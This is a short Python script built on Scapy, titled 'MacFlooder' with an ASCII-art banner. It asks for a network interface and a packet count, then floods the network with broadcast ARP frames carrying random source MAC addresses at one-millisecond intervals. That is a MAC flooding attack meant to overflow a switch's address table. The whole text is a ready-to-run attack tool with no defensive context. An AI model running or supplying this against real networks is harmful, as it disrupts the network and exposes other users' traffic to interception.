from colorama import Fore
from scapy.all import *
def MacFlooder():
    print """
	'||\   /||`               '||''''| '||`                   ||`               
	 ||\\.//||                 ||  .    ||                    ||                
	 ||     ||   '''|.  .|'',  ||''|    ||  .|''|, .|''|, .|''||  .|''|, '||''| 
	 ||     ||  .|''||  ||     ||       ||  ||  || ||  || ||  ||  ||..||  ||    
	.||     ||. `|..||. `|..' .||.     .||. `|..|' `|..|' `|..||. `|...  .||.  
 	   """
	
    Iface = raw_input("Please Enter The Interface: ")
    count = int(raw_input("Please Enter The Number Of Packet: "))
    Ethernet = Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")
    Arp = ARP(pdst="255.255.255.255", hwdst="ff:ff:ff:ff:ff:ff")
    sendp(Ethernet/Arp,iface=Iface,count=count,inter= .001)


